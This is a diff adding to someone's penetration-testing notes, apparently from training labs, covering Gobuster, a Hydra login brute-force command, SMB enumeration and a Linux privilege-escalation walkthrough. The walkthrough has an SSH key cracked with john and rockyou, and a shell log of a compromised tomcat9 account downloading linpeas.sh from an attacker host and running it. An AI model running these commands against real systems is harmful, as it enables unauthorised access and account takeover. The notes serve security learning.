@@ -1,4 +1,5 @@
 ## Gobuster
+(dirsearch) (usr share wordlists dirbuster directory list 2.3 medium txt)
 used for **brute-forcing directories, files, DNS subdomains, and virtual hosts** on web servers.
 
 **Directory and File Brute-Forcing (`dir` mode):**
@@ -24,6 +25,7 @@ used for **brute-forcing directories, files, DNS subdomains, and virtual hosts**
 - u can edit the code in the js and css files
 - `/.htaccess` > Apache. A common use for `.htaccess` is to restrict access to certain files or directories, or to redirect web traffic.
 - `/.DS_Store` > macOS. The `.DS_Store` file is a hidden file created by macOS to store custom attributes of its containing folder, such as icon positions and view options
+- `nc 10.10.250.121 31337` to establish a network connection
 
 ---
 ## Hydra
@@ -39,3 +41,36 @@ The options we pass into Hydra depend on which service (protocol) we’re attack
 `-t` > sets the number of threads to spawn
 
 > `hydra -l <username> -P <wordlist> 10.10.155.86 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
+
+----
+try using SMB service to enumerate information like username
+use tools like `enum4linux 10.10.3.181` or `smbclient -L //10.10.3.181 -U %`
+
+---
+example on privilege escalation on linux and switching to another user:
+-  `scp linpeas.sh jan@10.10.104.79:/dev/shm`
+- `./dev/shm/linpeas.sh`
+- `ssh2john id_rsa > pass.hash`
+- `john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash`
+- `ssh -i /home/kay/.ssh/id_rsa kay@10.10.104.79` > kay is the other user we want log in as
+```
+tomcat9@basic2:/tmp$ wget http://10.9.0.108/linpeas.sh
+wget http://10.9.0.108/linpeas.sh
+--2024-09-14 09:15:03--  http://10.9.0.108/linpeas.sh
+Connecting to 10.9.0.108:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 853290 (833K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+linpeas.sh          100%[===================>] 833.29K  1.90MB/s    in 0.4s    
+
+2024-09-14 09:15:04 (1.90 MB/s) - 'linpeas.sh' saved [853290/853290]
+
+tomcat9@basic2:/tmp$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+tomcat9@basic2:/tmp$ ./linpeas.sh
+./linpeas.sh
+```
+
+> on the Attackerbox linPEAS is located at /Tools/PEAS and you can locate it using
+`locate linPEAS`
